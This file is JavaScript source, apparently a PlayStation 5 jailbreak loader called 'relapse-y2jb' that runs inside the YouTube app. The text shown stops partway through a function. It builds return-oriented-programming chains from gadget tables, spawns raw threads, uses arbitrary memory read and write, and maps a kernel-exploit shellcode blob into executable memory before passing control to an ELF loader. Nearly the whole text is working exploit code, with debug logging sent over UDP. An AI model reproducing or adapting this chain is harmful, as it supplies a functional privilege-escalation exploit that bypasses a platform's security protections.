(async function () {
    try {
        const relapse_version = "relapse-y2jb 1.0";
        const WORKER_STACK_SIZE = 0x4000n;
        const WORKER_STACK_PASS = 0x2000n;
        const WORKER_CORE = "other";
        const CHAIN_TIMEOUT_MS = 20000;
        const FAIL_MARKER_NAME = "relapse.fail";
        const IGNORE_FAIL_MARKER = false;
        const RESTORE_EBOOT_AFTER_HANDOFF = true;
        const ALLOW_AFTER_P2JB = false;
        const PREPARE_FOR_KEXP = true;
        const WIDEN_EBOOT = true;
        const FHOLD_PIPES = false;
        const SKIP_HANDOFF = false;
        const STOP_AFTER = null;
        const CLOSE_PIPES_AFTER_RUN = false;
        const AIO_DUMP_WAITERS = false;
        const AIO_DUMP_AFTER_RELEASE = false;
        const AIO_LEAK_ON_EXIT = false;
        const AIO_POISON_SNAPSHOT = false;
        const POISON_ID_MAX = 512;        // ids examined (5 pipe reads each)
        const POISON_SNAPSHOT_MAX = 32;   // objects dumped (5 reads each)
        const POISON_WAITER_MAX = 64;
        const AIO_POISON_SCRUB = false;
        const AIO_CANCEL_ALL = false;
        const EXIT_TEST = null;
        const SKIP_RELEASE_WORKERS = false;
        const CLEAN_TEARDOWN = true;
        const RESTORE_REAL_BUFFERS = true;
        const LEAVE_PIPES_ARMED = false;
        const PIPE_STRUCT_DIFF = false;
        const PIPE_NOTE_FOR_CLEANER = false;
        const SKIP_OID_RESTORE = true;
        const FHOLD_AT_RESCUE = false;
        const CRASH_ARTIFACT_SCAN = false;
        const DIAGNOSE_AFTER_HANDOFF = false;
        const STABILIZE_CREDS = false;
        const PROBE_DLSYM = false;
        const REPORT_KEXP_SIGNATURE = true;
        const NET_LOG = "auto";
        const NET_LOG_PORT = 5050;
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
        let sync_log_buf = 0n;
        let socket_log_fd = null;
        function capture_log_socket() {
            try {
                if (typeof _log_socket_fd !== "undefined" && _log_socket_fd !== null) {
                    socket_log_fd = _log_socket_fd;
                    _log_socket_fd = null;      // stop log() from duplicating it
                }
            } catch (_) { }
        }
        function restore_log_socket() {
            try {
                if (socket_log_fd !== null && typeof _log_socket_fd !== "undefined")
                    _log_socket_fd = socket_log_fd;
            } catch (_) { }
            socket_log_fd = null;
        }
        let net_log_fd = 0n;          // 0n = disabled
        let net_log_sa = 0n;
        let net_log_target = "";
        let net_log_failures = 0;
        let net_log_error = "";
        let net_log_reason = "";
        function drain(num, fd, n, to) {
            let sent = 0;
            while (sent < n) {
                const w = to
                    ? syscall(num, fd, sync_log_buf + BigInt(sent), BigInt(n - sent),
                        0n, net_log_sa, 16n)
                    : syscall(num, fd, sync_log_buf + BigInt(sent), BigInt(n - sent));
                const k = Number(w);
                if (!(k > 0)) { net_log_failures++; return false; }
                sent += k;
            }
            net_log_failures = 0;
            return true;
        }
        function net_log_init() {
            try {
                if (NET_LOG === "off") return false;
                let ip;
                if (NET_LOG === "auto") {
                    if (socket_log_fd === null) {
                        net_log_reason = "the loader's log socket was not in scope, " +
                            "so there is no peer to ask";
                        return false;
                    }
                    const sa = hmalloc(16);
                    const len = hmalloc(8);
                    write64(sa, 0n); write64(sa + 8n, 0n); write64(len, 16n);
                    if (syscall(SYSCALL.getpeername, socket_log_fd, sa, len) === MASK64) {
                        net_log_reason = "getpeername() on the loader socket failed";
                        return false;
                    }
                    ip = [Number(read8(sa + 4n) & 0xffn), Number(read8(sa + 5n) & 0xffn),
                        Number(read8(sa + 6n) & 0xffn), Number(read8(sa + 7n) & 0xffn)];
                    if (ip[0] === 127) {
                        net_log_reason = "the payload came from the console itself " +
                            "(peer is loopback), so there is nowhere to mirror to - " +
                            "send it from the PC, or set NET_LOG to an address";
                        return false;
                    }
                    if (ip[0] === 0) {
                        net_log_reason = "the loader socket's peer address is 0.0.0.0";
                        return false;
                    }
                } else {
                    ip = String(NET_LOG).split(".").map(Number);
                    if (ip.length !== 4 || ip.some((o) => !(o >= 0 && o <= 255))) {
                        net_log_reason = "NET_LOG is not \"off\", \"auto\" or a dotted " +
                            "address: " + NET_LOG;
                        return false;
                    }
                }
                const fd = syscall(SYSCALL.socket, 2n /* AF_INET */,
                    2n /* SOCK_DGRAM */, 0n);
                if (fd === MASK64) {
                    net_log_reason = "socket(SOCK_DGRAM) failed";
                    return false;
                }
                const sa = hmalloc(16);
                for (let i = 0n; i < 16n; i += 1n) write8(sa + i, 0n);
                write8(sa + 1n, 2n /* AF_INET */);
                write16(sa + 2n, BigInt(((NET_LOG_PORT & 0xff) << 8) |
                    ((NET_LOG_PORT >> 8) & 0xff)));
                write32(sa + 4n, BigInt((ip[0] | (ip[1] << 8) | (ip[2] << 16) |
                    (ip[3] << 24)) >>> 0));
                net_log_fd = fd;
                net_log_sa = sa;
                net_log_target = ip.join(".") + ":" + NET_LOG_PORT + "/udp";
                return true;
            } catch (e) {
                net_log_error = (e && e.message) || String(e);
                net_log_fd = 0n;
                return false;
            }
        }
        let log_seq = 0;
        function log_now(msg) {
            log_seq++;
            const seq = (log_seq < 10 ? "00" : log_seq < 100 ? "0" : "") + log_seq;
            const text = "[relapse " + seq + "] " + msg;
            try {
                const pr = log(text);           // on-screen (async, may lag)
                if (pr && typeof pr.catch === "function") pr.catch(() => { });
            } catch (_) { }
            const toSocket = socket_log_fd !== null;
            const toNet = net_log_fd !== 0n && net_log_failures < 8;
            if (!toSocket && !toNet) return;
            try {
                const line = text + "\n";
                if (sync_log_buf === 0n) sync_log_buf = hmalloc(0x1000);
                const n = Math.min(line.length, 0xff0);
                for (let i = 0; i < n; i++)
                    write8(sync_log_buf + BigInt(i), BigInt(line.charCodeAt(i) & 0xff));
                if (toSocket) drain(SYSCALL.write, socket_log_fd, n, false);
                if (toNet) drain(SYSCALL.sendto, net_log_fd, n, true);
            } catch (_) { }
        }
        function say(msg) { log_now(msg); }
        async function asay(msg) { log_now(msg); }
        function fatal(msg) {
            say("FATAL: " + msg);
            try { send_notification("relapse: FATAL\n" + msg); } catch (_) { }
            throw new Error("relapse: " + msg);
        }
        {
            const missing = [];
            const need_fn = {
                syscall: typeof syscall, call: typeof call, malloc: typeof malloc,
                read8: typeof read8, read16: typeof read16, read32: typeof read32,
                read64: typeof read64, write8: typeof write8, write16: typeof write16,
                write32: typeof write32, write64: typeof write64, log: typeof log,
                send_notification: typeof send_notification,
                file_exists: typeof file_exists, write_file: typeof write_file,
                get_nidpath: typeof get_nidpath, alloc_string: typeof alloc_string,
            };
            const need_val = {
                ROP: typeof ROP, SYSCALL: typeof SYSCALL, libc_base: typeof libc_base,
                syscall_wrapper: typeof syscall_wrapper, FW_VERSION: typeof FW_VERSION,
            };
            for (const k in need_fn)
                if (need_fn[k] !== "function") missing.push(k + "() [" + need_fn[k] + "]");
            for (const k in need_val)
                if (need_val[k] === "undefined") missing.push(k);
            if (missing.length)
                fatal("Y2JB helpers missing: " + missing.join(", ") +
                    " (update Y2JB and retry)");
            const need_gadgets = ["ret", "pop_rax", "pop_rdi", "pop_rsi",
                "pop_rdx", "pop_rcx", "pop_r8", "pop_r9", "mov_qword_rdi_rax"];
            const no_gadget = need_gadgets.filter((g) => !ROP[g]);
            if (no_gadget.length)
                fatal("ROP gadget table is missing: " + no_gadget.join(", "));
        }
        const SYSCALL_EXTRA = {
            getrlimit: 0xC2n,
            setrlimit: 0xC3n,
            socketpair: 0x87n,
            pipe2: 0x2AFn,
            aio_multi_wait: 0x297n,
            aio_multi_poll: 0x298n,
            aio_multi_cancel: 0x29An,
            aio_submit_cmd: 0x29Dn,
            getpeername: 0x1Fn,
        };
        for (const k in SYSCALL_EXTRA)
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        const SYS_GETPID = SYSCALL.getpid;
        const SYS_GETUID = SYSCALL.getuid;
        const SYS_READ = SYSCALL.read;
        const SYS_WRITE = SYSCALL.write;
        const SYS_CLOSE = SYSCALL.close;
        const SYS_IOCTL = SYSCALL.ioctl;
        const SYS_SOCKET = SYSCALL.socket;
        const SYS_SETSOCKOPT = SYSCALL.setsockopt;
        const SYS_RECVFROM = SYSCALL.recvfrom;
        const SYS_SOCKETPAIR = SYSCALL.socketpair;
        const SYS_PIPE2 = SYSCALL.pipe2;
        const SYS_NETGETIFLIST = SYSCALL.netgetiflist;
        const SYS___SYSCTL = SYSCALL.sysctl;
        const SYS_GETRLIMIT = SYSCALL.getrlimit;
        const SYS_SETRLIMIT = SYSCALL.setrlimit;
        const SYS_CPUSET_GETAFFINITY = SYSCALL.cpuset_getaffinity;
        const SYS_CPUSET_SETAFFINITY = SYSCALL.cpuset_setaffinity;
        const SYS_RTPRIO_THREAD = SYSCALL.rtprio_thread;
        const SYS_IS_IN_SANDBOX = SYSCALL.is_in_sandbox;
        const SYS_AIO_SUBMIT_CMD = SYSCALL.aio_submit_cmd;
        const SYS_AIO_MULTI_WAIT = SYSCALL.aio_multi_wait;
        const SYS_AIO_MULTI_POLL = SYSCALL.aio_multi_poll;
        const SYS_AIO_MULTI_CANCEL = SYSCALL.aio_multi_cancel;
        const SYS_FCNTL = SYSCALL.fcntl;
        const F_SETFL = 4, O_NONBLOCK = 4;
        function int64(low = 0, hi = 0) {
            this.low = low >>> 0;
            this.hi = hi >>> 0;
            this.backing = null;
        }
        int64.prototype.add32 = function (value) {
            const low = (this.low + value) >>> 0;
            const hi = (this.hi + (low < this.low ? 1 : 0)) >>> 0;
            return new int64(low, hi);
        };
        int64.prototype.add32inplace = function (value) {
            const low = (this.low + value) >>> 0;
            this.hi = (this.hi + (low < this.low ? 1 : 0)) >>> 0;
            this.low = low;
        };
        int64.prototype.sub32inplace = function (value) {
            const low = (this.low - value) >>> 0;
            this.hi = (this.hi - (low > this.low ? 1 : 0)) >>> 0;
            this.low = low;
        };
        int64.prototype.toString = function (radix = 16) {
            const low = this.low.toString(radix);
            if (this.hi === 0) return low;
            const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
            return this.hi.toString(radix) + low.padStart(width, "0");
        };
        const MASK32 = 0xffffffffn;
        const MASK64 = 0xffffffffffffffffn;
        function big(v) {
            if (typeof v === "bigint") return v & MASK64;
            if (v instanceof int64)
                return ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)) & MASK64;
            if (typeof v === "number") {
                if (!Number.isInteger(v)) throw new TypeError("bad number " + v);
                return BigInt(v >>> 0);
            }
            throw new TypeError("cannot marshal " + typeof v + " " + String(v));
        }
        function fromBig(x) {
            const v = BigInt(x) & MASK64;
            return new int64(Number(v & MASK32), Number((v >> 32n) & MASK32));
        }
        function words(v) {
            if (v instanceof int64) return [BigInt(v.low >>> 0), BigInt(v.hi >>> 0)];
            if (typeof v === "bigint") {
                const x = v & MASK64;
                return [x & MASK32, (x >> 32n) & MASK32];
            }
            if (typeof v === "number")
                return v < 0 ? [BigInt(v >>> 0), MASK32] : [BigInt(v >>> 0), 0n];
            throw new TypeError("cannot marshal value " + String(v));
        }
        let tagged_malloc_seen = false;
        const M_PROT_R = (typeof PROT_READ !== "undefined") ? BigInt(PROT_READ) : 0x1n;
        const M_PROT_W = (typeof PROT_WRITE !== "undefined") ? BigInt(PROT_WRITE) : 0x2n;
        const M_PROT_X = (typeof PROT_EXEC !== "undefined") ? BigInt(PROT_EXEC) : 0x4n;
        const M_PROT_RW = M_PROT_R | M_PROT_W;
        const M_PROT_RWX = M_PROT_RW | M_PROT_X;
        const M_MAP_SHARED = (typeof MAP_SHARED !== "undefined") ? BigInt(MAP_SHARED) : 0x1n;
        const M_MAP_PRIVATE = (typeof MAP_PRIVATE !== "undefined") ? BigInt(MAP_PRIVATE) : 0x2n;
        const M_MAP_ANON = (typeof MAP_ANONYMOUS !== "undefined") ? BigInt(MAP_ANONYMOUS) : 0x1000n;
        const M_MAP_PRIV_ANON = M_MAP_PRIVATE | M_MAP_ANON;
        function is_canonical_user(v) {
            const x = BigInt(v) & MASK64;
            return x !== 0n && x < 0x0000800000000000n;
        }
        function hmalloc(size) {
            const n = BigInt(size);
            const addr = malloc(n);
            if (is_canonical_user(addr)) return addr;
            const pages = (n + 0x3fffn) & ~0x3fffn;
            const va = syscall(SYSCALL.mmap, 0n, pages, M_PROT_RW,
                M_MAP_PRIV_ANON, MASK64, 0n);
            if (!is_canonical_user(va))
                fatal("hmalloc: malloc returned a tagged pointer (0x" +
                    addr.toString(16) + ") and the mmap fallback for 0x" +
                    n.toString(16) + " bytes failed (0x" + va.toString(16) + ")");
            if (!tagged_malloc_seen) {
                tagged_malloc_seen = true;
                say("malloc() returns V8-tagged backing stores for large " +
                    "allocations on this app version - using mmap for every " +
                    "buffer native code touches (0x" + addr.toString(16) +
                    " -> 0x" + va.toString(16) + ")");
            }
            return va;
        }
        function native_ptr(what, addr) {
            if (!is_canonical_user(addr))
                fatal(what + " = 0x" + (BigInt(addr) & MASK64).toString(16) +
                    " is not a canonical user address - refusing to hand it " +
                    "to native code (would fault the console)");
            return BigInt(addr);
        }
        function kernel_ptr(what, addr) {
            const x = BigInt(addr) & MASK64;
            if ((x >> 48n) !== 0xffffn)
                fatal(what + " = 0x" + x.toString(16) + " is not a kernel address");
            return x;
        }
        const p = {
            malloc(size, type) { return fromBig(hmalloc(BigInt(size))); },
            read1(addr) { return Number(read8(big(addr)) & 0xffn); },
            read2(addr) { return Number(read16(big(addr)) & 0xffffn); },
            read4(addr) { return Number(read32(big(addr)) & MASK32); },
            read8(addr) { return fromBig(read64(big(addr))); },
            write1(addr, value) { write8(big(addr), words(value)[0] & 0xffn); },
            write2(addr, value) { write16(big(addr), words(value)[0] & 0xffffn); },
            write4(addr, value) { write32(big(addr), words(value)[0] & MASK32); },
            write8(addr, value) {
                const [lo, hi] = words(value);
                write64(big(addr), ((hi & MASK32) << 32n) | (lo & MASK32));
            },
            stringify(str) { return fromBig(alloc_string(str)); },
            writestr(addr, str) {
                for (let i = 0; i < str.length; i++) {
                    const byte = str.charCodeAt(i);
                    if (byte === 0) break;
                    write8(big(addr) + BigInt(i), BigInt(byte & 0xff));
                }
                write8(big(addr) + BigInt(str.length), 0n);
            },
        };
        function spawn_worker(chain_addr) {
            const thr_new_args = hmalloc(0x80);
            for (let i = 0n; i < 0x80n; i += 8n) write64(thr_new_args + i, 0n);
            const tid_addr = hmalloc(0x8);
            const cpid = hmalloc(0x8);
            const stack = hmalloc(WORKER_STACK_SIZE);
            const tls = hmalloc(0x40);
            for (let i = 0n; i < WORKER_STACK_SIZE; i += 8n)
                write64(stack + i, chain_addr);
            for (let i = 0n; i < 0x40n; i += 8n) write64(tls + i, 0n);
            write64(thr_new_args + 0x00n, ROP.pop_rsp);    // start_func
            write64(thr_new_args + 0x08n, 0n);             // arg (unused)
            write64(thr_new_args + 0x10n, stack);          // stack_base
            write64(thr_new_args + 0x18n, WORKER_STACK_PASS);
            write64(thr_new_args + 0x20n, tls);            // tls_base
            write64(thr_new_args + 0x28n, 0x40n);          // tls_size
            write64(thr_new_args + 0x30n, tid_addr);       // child_tid
            write64(thr_new_args + 0x38n, cpid);           // parent_tid
            const rv = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (rv !== 0n) throw new Error("thr_new failed: " + toHex(rv));
            return read64(tid_addr);
        }
        class Y2Chain {
            constructor(host) {
                this.p = host;
                this.entries = [];
                this.return_value = host.malloc(8);
                this.finished = hmalloc(8);
                write64(this.finished, 0n);
                this.workerAffinity = null;   // { core, rtprio }
                this.chainsRun = 0;
            }
            setWorkerAffinity(core, rtprio) {
                this.workerAffinity = { core, rtprio };
            }
            clear() { this.entries = []; }
            push(value) { this.entries.push(big(value)); }
            push_write8(dest, value) {
                this.push(ROP.pop_rdi); this.push(dest);
                this.push(ROP.pop_rsi); this.push(value);
                this.push(ROP.mov_qword_rdi_rsi);
            }
            write_result(dest) {
                this.push(ROP.pop_rdi); this.push(dest);
                this.push(ROP.mov_qword_rdi_rax);
            }
            push_sysv(rdi, rsi, rdx, rcx, r8, r9) {
                const args = [rdi, rsi, rdx, rcx, r8, r9];
                const regs = [ROP.pop_rdi, ROP.pop_rsi, ROP.pop_rdx,
                    ROP.pop_rcx, ROP.pop_r8, ROP.pop_r9];
                for (let i = 0; i < args.length; i++) {
                    if (args[i] === undefined) continue;
                    this.push(regs[i]);
                    this.push(args[i]);
                }
            }
            alignForCall() {
                if (this.entries.length % 2 !== 0) this.push(ROP.ret);
            }
            fcall(rip, rdi, rsi, rdx, rcx, r8, r9) {
                this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
                this.alignForCall();
                this.push(rip);
            }
            add_syscall(num, rdi, rsi, rdx, rcx, r8, r9) {
                this.push(ROP.pop_rax); this.push(num);
                this.fcall(syscall_wrapper, rdi, rsi, rdx, rcx, r8, r9);
            }
            add_syscall_ret(store, num, rdi, rsi, rdx, rcx, r8, r9) {
                this.add_syscall(num, rdi, rsi, rdx, rcx, r8, r9);
                this.write_result(store);
            }
            add_call(rip, rdi, rsi, rdx, rcx, r8, r9) {
                this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
            }
            async syscall(num, ...args) {
                const a = [0n, 0n, 0n, 0n, 0n, 0n];
                for (let i = 0; i < 6 && i < args.length; i++)
                    if (args[i] !== undefined) a[i] = big(args[i]);
                return fromBig(syscall(big(num), a[0], a[1], a[2], a[3], a[4], a[5]));
            }
            async call(rip, ...args) {
                const a = [0n, 0n, 0n, 0n, 0n, 0n];
                for (let i = 0; i < 6 && i < args.length; i++)
                    if (args[i] !== undefined) a[i] = big(args[i]);
                return fromBig(call(big(rip), a[0], a[1], a[2], a[3], a[4], a[5]));
            }
            async run() {
                const entries = this.entries.slice();
                if (entries.length === 0) return;
                const RUNWAY = 2;              // slots 0-1 are consumed before the body
                const PIN_MAX = 32;            // optional affinity/rtprio head
                const EPILOGUE = 16;           // flag write + thr_exit
                const qwords = RUNWAY + entries.length + PIN_MAX + EPILOGUE;
                const bytes = BigInt(qwords * 8) + 0x4000n;
                const buf = hmalloc(bytes);
                for (let i = 0n; i < bytes; i += 8n) write64(buf + i, 0n);
                const entry = (buf + 0x100n + 15n) & ~15n;
                let idx = 0;
                const emit = (v) => { write64(entry + BigInt(idx++ * 8), big(v)); };
                const alignEmit = () => { if (idx % 2 !== 0) emit(ROP.ret); };
                emit(ROP.ret);
                emit(ROP.ret);
                if (this.workerAffinity) {
                    const { core, rtprio } = this.workerAffinity;
                    const mask = hmalloc(0x10);
                    write64(mask, 1n << BigInt(core));
                    write64(mask + 8n, 0n);
                    const rt = hmalloc(0x10);
                    write64(rt, 0n);
                    write64(rt + 8n, 0n);
                    if (rtprio !== undefined && rtprio !== null)
                        write8(rt, BigInt(rtprio & 0xffff));
                    emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
                    emit(ROP.pop_rdi); emit(3n);            // CPU_LEVEL_WHICH
                    emit(ROP.pop_rsi); emit(1n);            // CPU_WHICH_TID
                    emit(ROP.pop_rdx); emit(MASK64);        // td = -1 (self)
                    emit(ROP.pop_rcx); emit(0x10n);
                    emit(ROP.pop_r8); emit(mask);
                    alignEmit(); emit(syscall_wrapper);
                    if (rtprio !== undefined && rtprio !== null) {
                        emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
                        emit(ROP.pop_rdi); emit(1n);        // RTP_SET
                        emit(ROP.pop_rsi); emit(0n);
                        emit(ROP.pop_rdx); emit(rt);
                        alignEmit(); emit(syscall_wrapper);
                    }
                }
                if (idx % 2 !== 0) emit(ROP.ret);
                for (const e of entries) emit(e);
                emit(ROP.pop_rax); emit(1n);
                emit(ROP.pop_rdi); emit(this.finished);
                emit(ROP.mov_qword_rdi_rax);
                emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
                emit(ROP.pop_rdi); emit(0n);
                alignEmit(); emit(syscall_wrapper);
                emit(ROP.ret);
                if (idx > qwords)
                    throw new Error("chain overflow: " + idx + " > " + qwords);
                write64(this.finished, 0n);
                const tid = spawn_worker(entry);
                this.chainsRun++;
                const deadline = Date.now() + CHAIN_TIMEOUT_MS;
                while (read64(this.finished) === 0n) {
                    if (Date.now() > deadline)
                        throw new Error("the chain worker (tid " + tid +
                            ", " + entries.length + " entries) never finished " +
                            "in " + (CHAIN_TIMEOUT_MS / 1000) + "s - reboot");
                    await sleep(1);
                }
                this.clear();
            }
        }
        async function probe_worker_chain(chain) {
            const pid_buf = hmalloc(8);
            write64(pid_buf, 0n);
            chain.clear();
            chain.add_syscall_ret(pid_buf, SYSCALL.getpid);
            await chain.run();
            const via_chain = read64(pid_buf);
            const via_host = syscall(SYSCALL.getpid);
            if (via_chain === 0n || via_chain !== via_host)
                fatal("worker chain self-test failed (chain getpid " +
                    toHex(via_chain) + ", host getpid " + toHex(via_host) +
                    ") - thr_new/ROP.pop_rsp do not behave as expected on " +
                    "this YouTube app version");
            say("worker chain self-test OK (pid " + via_chain.toString(10) + ")");
        }
        const KEXP_BIN_NAMES = ["kexp_2026_05_25.bin", "kexp.bin"];
        const ELFLDR_NAMES = ["elfldr-ps5-1360.elf", "elfldr-ps5-0.23.elf",
            "elfldr_1320_v5.elf", "elfldr.elf"];
        const CACHE_SUBDIR = "download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=";
        function payload_dirs() {
            const dirs = [];
            let title = null;
            try {
                if (typeof TITLE_ID === "string" && TITLE_ID.length) title = TITLE_ID;
                else if (typeof get_title_id === "function") title = get_title_id();
            } catch (_) { }
            if (title)
                for (const slot of ["000", "001", "002"])
                    dirs.push("/mnt/sandbox/" + title + "_" + slot + "/" + CACHE_SUBDIR);
            for (let u = 0; u < 8; u++) dirs.push("/mnt/usb" + u);
            return dirs;
        }
        function list_dir(path, max) {
            const path_addr = alloc_string(path);
            const fd = syscall(SYSCALL.open, path_addr, 0n /* O_RDONLY */);
            if (fd === MASK64) return null;
            const buf = hmalloc(0x4000);
            const out = [];
            try {
                for (let round = 0; round < 8 && out.length < max; round++) {
                    const len = Number(syscall(SYSCALL.getdents, fd, buf, 0x4000n));
                    if (len <= 0) break;
                    let off = 0;
                    while (off < len && out.length < max) {
                        const reclen = Number(read16(buf + BigInt(off) + 16n));
                        if (reclen < 24 || off + reclen > len) break;
                        const namlen = Number(read8(buf + BigInt(off) + 19n));
                        let name = "";
                        for (let i = 0; i < namlen && i < 255; i++)
                            name += String.fromCharCode(
                                Number(read8(buf + BigInt(off) + 20n + BigInt(i))));
                        out.push(name);
                        off += reclen;
                    }
                }
            } catch (_) {
            } finally {
                try { syscall(SYSCALL.close, fd); } catch (_) { }
            }
            return out;
        }
        function scan_for(pattern, tried) {
            for (const dir of payload_dirs()) {
                let names = null;
                try { names = list_dir(dir, 128); } catch (e) { names = null; }
                if (!names) continue;
                const hit = names.filter((n) => pattern.test(n));
                if (hit.length) {
                    tried.push("getdents(" + dir + ") matched " + hit.join(", "));
                    return dir + "/" + hit[0];
                }
            }
            tried.push("getdents pattern scan for " + pattern);
            return null;
        }
        function find_payload(names, pattern, tried) {
            if (typeof find_file === "function")
                for (const name of names) {
                    let path = null;
                    try { path = find_file(name); } catch (e) { tried.push("find_file(" + name + ") threw " + e.message); }
                    if (path) { tried.push("find_file(" + name + ") -> " + path); return { path, via: "find_file" }; }
                }
            else tried.push("find_file() not in scope");
            for (const dir of payload_dirs())
                for (const name of names) {
                    const path = dir + "/" + name;
                    let ok = false;
                    try { ok = file_exists(path); } catch (e) { tried.push("file_exists(" + path + ") threw " + e.message); }
                    if (ok) return { path, via: "search" };
                }
            tried.push("file_exists over " + payload_dirs().length + " dirs x " + names.length + " names");
            const scanned = scan_for(pattern, tried);
            if (scanned) return { path: scanned, via: "getdents" };
            return null;
        }
        function mmap_rw(size) {
            const pages = (BigInt(size) + 0x3fffn) & ~0x3fffn;
            const va = syscall(SYSCALL.mmap, 0n, pages, M_PROT_RW,
                M_MAP_PRIV_ANON, MASK64, 0n);
            if (!is_canonical_user(va))
                fatal("mmap(0x" + pages.toString(16) + ", RW) failed: 0x" +
                    (BigInt(va) & MASK64).toString(16));
            return va;
        }
        async function elfldr_bytes(tried) {
            try {
                if (typeof load_elfldr === "function") {
                    await load_elfldr();
                    if (typeof elfldr_data !== "undefined" && elfldr_data && elfldr_data.length > 0x1000) {
                        tried.push("framework load_elfldr() -> " + elfldr_data.length + " bytes");
                        return { data: elfldr_data, via: "load_elfldr" };
                    }
                    tried.push("framework load_elfldr() produced no elfldr_data");
                } else tried.push("load_elfldr() not in scope");
            } catch (e) {
                tried.push("load_elfldr() threw " + e.message);
            }
            return null;
        }
        function payload_fail(what, names, tried) {
            let title = "?";
            try { title = (typeof TITLE_ID === "string" && TITLE_ID) ? TITLE_ID : get_title_id(); } catch (_) { }
            fatal("no " + what + " found (names: " + names.join(", ") + "; TITLE_ID " +
                title + "; find_file=" + (typeof find_file) + ", read_file=" +
                (typeof read_file) + ", file_exists=" + (typeof file_exists) +
                "; cache dir " + CACHE_SUBDIR + "). Probed:\n  " +
                tried.join("\n  ") + "\nIf the sandbox cache is empty, Y2JB's " +
                "payload files were evicted - re-install/re-copy them (see the " +
                "Y2JB setup) or put " + names[0] + " on a USB stick.");
        }
        const KEXP_SIG = {
            size: 18912,
            resolverCalls: [[0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
                            [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]]],
            getpidAt: 0x10f1,
            logCalls: [0x126d, 0x12ad, 0x3bc2],
            imports: {
                libkernel: { sceKernelSendNotificationRequest: 0x48b0,
                    sysctlbyname: 0x48b8, pthread_create: 0x48c0,
                    pthread_join: 0x48c8 },
                libc: { malloc: 0x48d0, free: 0x48d8, memcpy: 0x48e0,
                    memset: 0x48e8, strcmp: 0x48f0, memcmp: 0x48f8,
                    vsnprintf: 0x4900 },
            },
        };
        function report_kexp_signature(data) {
            const at = (o, n) => Array.from(data.subarray(o, o + n));
            const eq = (o, want) => at(o, want.length).every((b, i) => b === want[i]);
            const okSize = data.length === KEXP_SIG.size;
            const okRes = KEXP_SIG.resolverCalls.every(([o, b]) => eq(o, b));
            const qword = (o) => {
                let v = 0n;
                for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(data[o + i]);
                return v;
            };
            let filled = 0;
            for (const group of Object.values(KEXP_SIG.imports))
                for (const off of Object.values(group))
                    if (qword(off) !== 0n) filled++;
            log_now("handoff 3b: blob " + data.length + " bytes (expected " +
                KEXP_SIG.size + ", " + (okSize ? "ok" : "MISMATCH") +
                "), resolver calls " + (okRes ? "intact" : "ALTERED") +
                ", logCalls " + KEXP_SIG.logCalls.map((o) =>
                    data[o] === 0xe8 ? "live" : data[o] === 0x90 ? "nop" : "?").join("/") +
                ", import slots filled " + filled + "/11" +
                " -> the blob resolves its own imports at runtime");
            return okSize && okRes;
        }
        async function handoff_kexp(allproc, master_pipe, victim_pipe) {
            const tried = [];
            const elf_names = ELFLDR_NAMES.slice();
            const bin_names = KEXP_BIN_NAMES.slice();
            try {
                if (typeof ELFLDR_NAME === "string" && ELFLDR_NAME) elf_names.unshift(ELFLDR_NAME);
                if (typeof BIN_NAME === "string" && BIN_NAME) bin_names.unshift(BIN_NAME);
            } catch (_) { }
            let elf = await elfldr_bytes(tried);
            if (!elf) {
                const found = find_payload(elf_names, /^elfldr.*\.elf$/i, tried);
                if (!found) payload_fail("elfldr", elf_names, tried);
                elf = { data: read_file(found.path), via: found.path };
            }
            const kfound = find_payload(bin_names, /^kexp.*\.bin$/i, tried);
            if (!kfound) payload_fail("kexp shellcode", bin_names, tried);
            const kexp_data = read_file(kfound.path);
            const elfldr_data = elf.data;
            await asay("handoff 1/6: elfldr via " + elf.via + " (" +
                elfldr_data.length + " bytes), kexp " + kfound.path + " (" +
                kexp_data.length + " bytes)");
            if (elfldr_data.length < 0x1000)
                fatal("elfldr image is only " + elfldr_data.length + " bytes");
            const elfldr_va = native_ptr("elfldr image", mmap_rw(elfldr_data.length));
            write_buffer(elfldr_va, elfldr_data);
            if (Number(read8(elfldr_va) & 0xffn) !== 0x7f)
                fatal("elfldr image did not land at 0x" + elfldr_va.toString(16) +
                    " (magic 0x" + read8(elfldr_va).toString(16) + ")");
            await asay("handoff 2/6: elfldr image @ 0x" + elfldr_va.toString(16) +
                " (magic ok)");
            const kexp_size = (BigInt(kexp_data.length) + 0x3fffn) & ~0x3fffn;
            const exec_fd = syscall(SYSCALL.jitshm_create, 0n, kexp_size, M_PROT_RWX);
            if (exec_fd === MASK64 || exec_fd < 0n || exec_fd >= 0x100000n)
                fatal("jitshm_create(0x" + kexp_size.toString(16) +
                    ") failed: 0x" + (exec_fd & MASK64).toString(16));
            let entry = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RWX, M_MAP_SHARED,
                exec_fd, 0n);
            if (!is_canonical_user(entry)) {
                const alias_fd = syscall(SYSCALL.jitshm_alias, exec_fd, M_PROT_RW);
                const rw = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RW,
                    M_MAP_SHARED, alias_fd, 0n);
                if (!is_canonical_user(rw)) fatal("could not map the kexp shellcode");
                write_buffer(rw, kexp_data);
                entry = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RWX, M_MAP_SHARED,
                    exec_fd, 0n);
                if (!is_canonical_user(entry)) fatal("could not map the kexp shellcode RWX");
            } else {
                write_buffer(entry, kexp_data);
            }
            entry = native_ptr("kexp entry", entry);
            await asay("handoff 3/6: kexp shellcode mapped @ 0x" +
                entry.toString(16));
            if (REPORT_KEXP_SIGNATURE) {
                try { report_kexp_signature(kexp_data); } catch (e) {
                    log_now("handoff 3b: signature report failed: " + e.message);
                }
            }
            const args = native_ptr("kexp args", mmap_rw(0x40));
            for (let i = 0n; i < 0x40n; i += 8n) write64(args + i, 0n);
            write32(args + 0x00n, BigInt(master_pipe[0]));
